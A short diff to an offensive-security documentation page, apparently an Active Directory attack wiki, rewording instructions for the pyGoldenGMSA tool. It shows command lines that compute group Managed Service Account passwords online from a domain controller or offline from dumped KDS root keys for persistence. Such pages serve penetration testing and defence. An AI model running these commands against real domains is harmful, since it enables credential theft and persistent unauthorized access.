@@ -150,13 +150,13 @@ print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest())
 
 [pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) can compute gMSA passwords either online (requiring network access to the DC) or offline (using previously dumped KDS root keys), making it particularly useful for persistence scenarios where the attacker may not have continuous access to the domain.
 
-**Online computation** (automatically retrieves KDS root key and password ID from the DC):
+Online computation (reads KDS root keys directly from the DC, which requires high privileges):
 
 ```bash
 python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP compute --sid $GMSA_SID
 ```
 
-**Offline computation** (no network access required, using previously dumped KDS root key and password ID):
+Offline computation (no network access required, using previously dumped KDS root key and password ID). This is the typical persistence workflow:
 
 ```bash
 python3 main.py compute --sid $GMSA_SID --kdskey "AQAAAOlMCM5U37Qv...<base64>..." --pwdid "AQAAAEtEU0sC...<base64>..."
